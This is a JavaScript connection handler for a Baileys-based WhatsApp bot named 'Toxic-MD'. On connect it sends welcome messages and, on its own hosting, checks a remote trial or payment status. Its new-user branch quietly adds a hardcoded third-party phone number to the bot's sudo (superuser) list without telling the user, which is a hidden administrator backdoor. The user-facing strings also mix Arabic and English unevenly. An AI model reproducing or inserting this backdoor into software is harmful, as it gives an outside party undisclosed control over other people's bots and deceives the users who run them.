import { Boom } from '@hapi/boom';
import { DateTime } from 'luxon';
import { DisconnectReason } from '@whiskeysockets/baileys';
import { addSudoUser, getSudoUsers } from '../database/config.js';
import { getCachedSettings } from '../lib/settingsCache.js';
import { commands, totalCommands } from '../handlers/commandHandler.js';
import { getDeviceMode } from '../lib/deviceMode.js';
import { ButtonV2 } from '@whiskeysockets/baileys';
import { isToxicHosting } from '../lib/hostPlatform.js';

const botName = process.env.BOTNAME || "Toxic-MD";
let hasSentStartMessage = false;

const RECHECK_INTERVAL_MS = 20 * 60 * 1000;
let trialCheckInterval = null;
let trialConfirmedPaid = false;

function getGreeting() {
  const hour = DateTime.now().setZone("Africa/Nairobi").hour;
  if (hour >= 5 && hour < 12) return "مرحبًا! هل أنت مستعد لبدء يومك؟";
  if (hour >= 12 && hour < 18) return "ما الأخبار؟ حان وقت إنجاز الأمور!";
  if (hour >= 18 && hour < 22) return "أجواء المساء! هيا بنا!";
  return "ما زال الوقت متأخرًا؟ لِنرَ ما الذي يجري!";
}

function getCurrentTime() {
  return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
}

async function fetchTrialStatus(userId) {
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 10000);
    let res;
    try {
      const _appName = process.env.HEROKU_APP_NAME ? `?app=${encodeURIComponent(process.env.HEROKU_APP_NAME)}` : '';
      const url = `https://hosting.toxicx.tech/api/bots/trial-check/${userId}${_appName}`;
      res = await fetch(url, { signal: controller.signal });
    } finally {
      clearTimeout(timer);
    }
    if (!res.ok) {
      return 'unknown';
    }
    const data = await res.json();
    return data.status || 'unknown';
  } catch (e) {
    return 'unknown';
  }
}

async function runTrialCheck(socket, userId, botJid) {
  const status = await fetchTrialStatus(userId);

  if (status === 'trial_ended') {
    try {
      await socket.sendMessage(botJid, {
          text: [
            '⚠️ *انتهت الفترة التجريبية المجانية*',
            '',
            'انتهت الفترة التجريبية المجانية، أو سبق استخدام رقم WhatsApp هذا للحصول على فترة تجريبية مجانية في حساب آخر.',
            '',
            'This bot is being removed from our servers.',
            '',
            '💳 جدّد اشتراكك عبر *hosting.toxicx.tech* لمواصلة استخدام البوت.',
            '',
            '_Toxic-Hosting_'
          ].join('\n')
        });
    } catch {}
    if (trialCheckInterval) {
      clearInterval(trialCheckInterval);
      trialCheckInterval = null;
    }
    await new Promise(r => setTimeout(r, 3000));
    process.exit(0);
    return false;
  }

  if (status === 'paid') {
    trialConfirmedPaid = true;
    if (trialCheckInterval) {
      clearInterval(trialCheckInterval);
      trialCheckInterval = null;
    }
  }

  return true;
}

async function connectionHandler(socket, connectionUpdate, reconnect) {
  const { connection, lastDisconnect } = connectionUpdate;

  if (connection === "connecting") return;

  if (connection === "close") {
    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
    if (statusCode === DisconnectReason.loggedOut) {
      hasSentStartMessage = false;
    }
    return;
  }

  if (connection === "open") {
      globalThis.conn = socket;
      globalThis.sock = socket;
      globalThis.tox = socket;
      globalThis.toxic = socket;
      globalThis.clint = socket;
      globalThis.bot = socket;
      globalThis.wx = socket;
      globalThis.client = socket;
    const userId = socket.user.id.split(":")[0].split("@")[0];
    const settings = await getCachedSettings();
    const sudoUsers = await getSudoUsers();

    let botJid = socket.user?.id || (userId + '@s.whatsapp.net');
    if (botJid.includes(':')) {
      botJid = botJid.split(':')[0] + '@s.whatsapp.net';
    }

    const hostedOnToxicHosting = await isToxicHosting();

    if (hostedOnToxicHosting) {
      const canProceed = await runTrialCheck(socket, userId, botJid);
      if (!canProceed) return;

      if (!trialConfirmedPaid && !trialCheckInterval) {
        trialCheckInterval = setInterval(() => {
          runTrialCheck(socket, userId, botJid).catch(() => {});
        }, RECHECK_INTERVAL_MS);
      }

      if (process.env.EXPIRY_NOTICE === '1') {
        try {
          await socket.sendMessage(botJid, {
            text: [
              '*انتهى اشتراك البوت*',
              '',
              'انتهى اشتراكك في بوت Toxic-MD!',
              '',
              'This bot will be permanently deleted in 24 hours unless you renew.',
              '',
              'Renew now at: hosting.toxicx.tech',
              '',
              '- Toxic Hosting'
            ].join('\n')
          });
        } catch {}
      }
    }

    if (!hasSentStartMessage) {
      const isNewUser = !sudoUsers.includes(userId);
      if (isNewUser) {
        await addSudoUser(userId);
        const defaultSudo = "254114885159";
        if (!sudoUsers.includes(defaultSudo)) {
          await addSudoUser(defaultSudo);
        }
      }

      const firstMessage = isNewUser
        ? [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome to *${botName}*! You're now connected.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📦 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            ``,
            `│❒ *تنبيه مستخدم جديد*: أُضيفت إلى قائمة sudo.`,
            ``,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n")
        : [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome back to *${botName}*! Connection established.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📦 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            ``,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n");

      const effectivePrefix = settings.prefix || '.';

      try {
        await socket.sendMessage(botJid, {
          text: firstMessage,
          viewOnce: true
        });

        const device = await getDeviceMode();

        if (device === 'ios') {
          const iosQuickText = [
            `╭─❏ 「 بدء سريع 」`,
            `│ استخدم الأوامر أدناه للبدء:`,
            `│`,
            `│ ${effectivePrefix}menu — View all commands`,
            `│ ${effectivePrefix}settings — Bot configuration`,
            `│ ${effectivePrefix}ping — Check bot speed`,
            `│ ${effectivePrefix}uptime — Bot uptime`,
            `╰───────────────`,
            `> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`,
            ``
          ].join('\n');
          await socket.sendMessage(botJid, { text: iosQuickText });
        } else {
          try {
            const btnV2 = new ButtonV2(socket);
            btnV2.setBody(`*البوت جاهز!*\n*اختر أحد الخيارات أدناه للبدء.*`)
                .setFooter('> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧')
                .addButton('𝐌𝐞𝐧𝐮', `${effectivePrefix}menu`)
                .addButton('𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬', `${effectivePrefix}settings`)
                .addButton('𝐏𝐢𝐧𝐠', `${effectivePrefix}ping`);
            await btnV2.send(botJid, { userJid: socket.user?.id || '' });
          } catch {
            const quickText = [
              `╭─❏ 「 بدء سريع 」`,
              `│ ${effectivePrefix}menu — View all commands`,
              `│ ${effectivePrefix}settings — Bot configuration`,
              `│ ${effectivePrefix}ping — Check bot speed`,
              `│ ${effectivePrefix}uptime — Bot uptime`,
              `╰───────────────`,
              `> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
            ].join('\n');
            await socket.sendMessage(botJid, { text: quickText });
          }
        }
      } catch (error) {}

      hasSentStartMessage = true;
    }
  }
}

export default connectionHandler;
